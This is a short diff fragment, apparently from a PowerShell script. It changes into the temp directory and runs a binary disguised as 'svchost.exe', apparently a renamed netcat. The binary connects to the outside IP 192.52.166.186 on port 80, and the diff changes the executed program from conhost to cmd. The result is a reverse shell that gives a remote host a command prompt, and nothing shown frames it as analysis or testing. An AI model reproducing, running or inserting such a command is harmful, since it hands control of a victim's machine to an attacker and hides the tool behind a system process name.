@@ -44,4 +44,4 @@ try {
 }
 
 cd $env:tmp
-.\svchost.exe 192.52.166.186 80 -e conhost
+.\svchost.exe 192.52.166.186 80 -e cmd
